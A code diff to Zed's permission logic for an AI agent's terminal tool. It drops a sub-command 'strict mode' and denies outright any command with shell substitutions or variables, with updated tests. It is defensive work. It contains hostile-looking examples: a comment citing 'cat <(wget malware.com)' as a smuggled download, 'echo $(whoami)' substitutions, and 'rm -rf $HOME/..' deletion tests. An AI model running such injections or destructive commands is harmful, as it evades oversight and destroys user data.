@@ -11,11 +11,11 @@ use util::shell::ShellKind;
 
 const HARDCODED_SECURITY_DENIAL_MESSAGE: &str = "Blocked by built-in security rule. This operation is considered too \
      harmful to be allowed, and cannot be overridden by settings.";
-const INVALID_TERMINAL_COMMAND_MESSAGE: &str = "The terminal command could not be approved because Zed's shell \
-     parser could not parse the command syntax. Please simplify the command or ask the user to run it directly.";
-const UNSAFE_SUBCOMMAND_DENIAL_MESSAGE: &str = "The terminal command was blocked because it contains shell \
-     substitutions (e.g. $(...), <(...), backticks) whose sub-commands are not all listed in your always_allow \
-     patterns. Add each sub-command to your always_allow patterns, or ask the user to run the command directly.";
+const INVALID_TERMINAL_COMMAND_MESSAGE: &str = "The terminal command could not be approved \
+     because it contains shell substitutions or interpolations ($VAR, ${VAR}, $(...), \
+     backticks, $((...)), <(...), >(...)) or uses syntax that Zed's parser cannot safely \
+     parse. Resolve those values to literal strings before calling terminal, or ask the \
+     user to run the command directly.";
 
 /// Security rules that are always enforced and cannot be overridden by any setting.
 /// These protect against catastrophic operations like wiping filesystems.
@@ -272,14 +272,10 @@ impl ToolPermissionDecision {
         }
 
         if tool_name == TerminalTool::NAME
-            && !rules.map_or(
-                matches!(permissions.default, ToolPermissionMode::Allow),
-                |rules| is_unconditional_allow_all(rules, permissions.default),
-            )
             && inputs.iter().any(|input| {
                 matches!(
                     validate_terminal_command(input),
-                    TerminalCommandValidation::Unsupported
+                    TerminalCommandValidation::Unsafe | TerminalCommandValidation::Unsupported
                 )
             })
         {
@@ -331,20 +327,12 @@ impl ToolPermissionDecision {
                     tool_name,
                     false,
                     permissions.default,
-                    false,
                 );
             }
 
             // Expand each input into its sub-commands and check them all together.
             let mut all_commands = Vec::new();
             let mut any_parse_failed = false;
-            let any_unsafe = !is_unconditional_allow_all(rules, permissions.default)
-                && inputs.iter().any(|input| {
-                    matches!(
-                        validate_terminal_command(input),
-                        TerminalCommandValidation::Unsafe
-                    )
-                });
             for input in inputs {
                 match extract_commands(input) {
                     Some(commands) => all_commands.extend(commands),
@@ -355,16 +343,12 @@ impl ToolPermissionDecision {
                 }
             }
             // If any command failed to parse, disable allow patterns for safety.
-            // If the input contained unsafe shell syntax (substitutions), enable
-            // strict mode so sub-commands that aren't explicitly allowed are denied
-            // rather than falling back to the configured default.
             check_commands(
                 all_commands,
                 rules,
                 tool_name,
                 !any_parse_failed,
                 permissions.default,
-                any_unsafe,
             )
         } else {
             check_commands(
@@ -373,7 +357,6 @@ impl ToolPermissionDecision {
                 tool_name,
                 true,
                 permissions.default,
-                false,
             )
         }
     }
@@ -389,19 +372,12 @@ impl ToolPermissionDecision {
 /// The `allow_enabled` flag controls whether allow patterns are checked. This is set
 /// to `false` when we can't reliably parse shell commands (e.g., parse failures or
 /// unsupported shell syntax), ensuring we don't auto-allow potentially dangerous commands.
-///
-/// The `strict_mode` flag is set when the original command contained unsafe shell syntax
-/// (process substitution, command substitution, etc.). In strict mode, if not every
-/// extracted sub-command matches an allow pattern the call is denied rather than falling
-/// back to the configured default. This prevents injection attacks where a trusted outer
-/// command (`cat`, `echo`, …) is used to smuggle an untrusted inner command (`wget`, …).
 fn check_commands(
     commands: impl IntoIterator<Item = String>,
     rules: &ToolRules,
     tool_name: &str,
     allow_enabled: bool,
     global_default: ToolPermissionMode,
-    strict_mode: bool,
 ) -> ToolPermissionDecision {
     // Single pass through all commands:
     // - DENY: If ANY command matches a deny pattern, deny immediately (short-circuit)
@@ -433,19 +409,6 @@ fn check_commands(
         }
     }
 
-    // After processing all commands, check accumulated state.
-    //
-    // In strict mode (unsafe shell syntax present) we require every extracted
-    // sub-command to be explicitly covered by an allow pattern. Anything less
-    // is denied so that an untrusted inner command cannot piggyback on a
-    // trusted outer one (e.g. `cat <(wget malware.com)`).
-    if strict_mode && had_any_commands {
-        if allow_enabled && all_matched_allow {
-            return ToolPermissionDecision::Allow;
-        }
-        return ToolPermissionDecision::Deny(UNSAFE_SUBCOMMAND_DENIAL_MESSAGE.into());
-    }
-
     if any_matched_confirm {
         return ToolPermissionDecision::Confirm;
     }
@@ -461,18 +424,6 @@ fn check_commands(
         ToolPermissionMode::Allow => ToolPermissionDecision::Allow,
         ToolPermissionMode::Confirm => ToolPermissionDecision::Confirm,
     }
-}
-
-fn is_unconditional_allow_all(rules: &ToolRules, global_default: ToolPermissionMode) -> bool {
-    // `always_allow` is intentionally not checked here: when the effective default
-    // is already Allow and there are no deny/confirm restrictions, allow patterns
-    // are redundant — the user has opted into allowing everything.
-    rules.always_deny.is_empty()
-        && rules.always_confirm.is_empty()
-        && matches!(
-            rules.default.unwrap_or(global_default),
-            ToolPermissionMode::Allow
-        )
 }
 
 /// Checks if the tool rules contain any invalid regex patterns.
@@ -1145,21 +1096,19 @@ mod tests {
     }
 
     #[test]
-    fn invalid_substitution_bearing_command_confirms_in_confirm_mode() {
-        // No tool-specific rules means strict_mode is never reached (rules == None
-        // causes an early return before check_commands). Global default applies.
+    fn invalid_substitution_bearing_command_denies_in_confirm_mode() {
         let decision = no_rules("echo $(whoami)", ToolPermissionMode::Confirm);
-        assert_eq!(decision, ToolPermissionDecision::Confirm);
+        assert!(matches!(decision, ToolPermissionDecision::Deny(_)));
     }
 
     #[test]
-    fn unconditional_allow_all_bypasses_invalid_command_rejection_without_tool_rules() {
+    fn substitutions_are_denied_even_without_tool_rules() {
         let decision = no_rules("echo $HOME", ToolPermissionMode::Allow);
-        assert_eq!(decision, ToolPermissionDecision::Allow);
+        assert!(matches!(decision, ToolPermissionDecision::Deny(_)));
     }
 
     #[test]
-    fn unconditional_allow_all_bypasses_invalid_command_rejection_with_terminal_default_allow() {
+    fn substitutions_are_denied_even_in_unconditional_allow_all_mode() {
         let mut tools = collections::HashMap::default();
         tools.insert(
             Arc::from(TerminalTool::NAME),
@@ -1176,15 +1125,15 @@ mod tests {
             tools,
         };
 
-        assert_eq!(
+        assert!(matches!(
             ToolPermissionDecision::from_input(
                 TerminalTool::NAME,
                 &["echo $(whoami)".to_string()],
                 &permissions,
                 ShellKind::Posix,
             ),
-            ToolPermissionDecision::Allow
-        );
+            ToolPermissionDecision::Deny(_)
+        ));
     }
 
     #[test]
@@ -1443,10 +1392,10 @@ mod tests {
     }
 
     #[test]
-    fn nested_command_substitution_is_allowed_when_all_subcommands_match() {
+    fn nested_command_substitution_is_denied() {
         t("echo $(cat $(whoami).txt)")
             .allow(&["^echo", "^cat", "^whoami"])
-            .is_allow();
+            .is_deny();
     }
 
     #[test]
@@ -1765,11 +1714,11 @@ mod tests {
         t("rm -rf ${HOME}/./").is_deny();
         t("rm -rf $HOME/a/b/../..").is_deny();
         t("rm -rf ${HOME}/foo/bar/../..").is_deny();
-        // Subdirectories should NOT be blocked
-        t("rm -rf $HOME/subdir")
+        // Subdirectories should NOT be blocked (using ~ since $HOME is now rejected at Gate 1)
+        t("rm -rf ~/subdir")
             .mode(ToolPermissionMode::Allow)
             .is_allow();
-        t("rm -rf ${HOME}/Documents")
+        t("rm -rf ~/Documents")
             .mode(ToolPermissionMode::Allow)
             .is_allow();
     }
@@ -1840,9 +1789,6 @@ mod tests {
             .mode(ToolPermissionMode::Allow)
             .is_allow();
         t("rm -rf ~/Documents")
-            .mode(ToolPermissionMode::Allow)
-            .is_allow();
-        t("rm -rf $HOME/Documents")
             .mode(ToolPermissionMode::Allow)
             .is_allow();
         t("rm -rf ../some_dir")
